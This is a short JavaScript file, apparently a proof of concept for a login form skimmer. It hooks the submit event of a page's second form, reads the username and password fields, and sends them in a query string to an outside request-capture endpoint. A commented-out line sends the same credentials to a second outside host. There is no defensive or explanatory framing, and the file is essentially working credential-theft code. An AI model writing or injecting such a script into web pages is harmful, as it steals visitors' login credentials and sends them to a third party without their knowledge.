function start() {
    console.log('start')
    const form = document.forms[1]

    const sendToMe = async function (event) {
        const username = event.currentTarget[0].value
        const password = event.currentTarget[1].value
        fetch(`https://mockbin.com/request?username=${username}&password=${password}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
        })
        .then(response => {
            console.log(response);
        })
        .catch(err => {
            console.log(err);
        });
        // const response = await fetch(`http://ismage.com/xyfjk32/g?u=${username}&p=${password}`)
    }
    form.addEventListener('submit', sendToMe);
    console.log('form attached')
}


start()
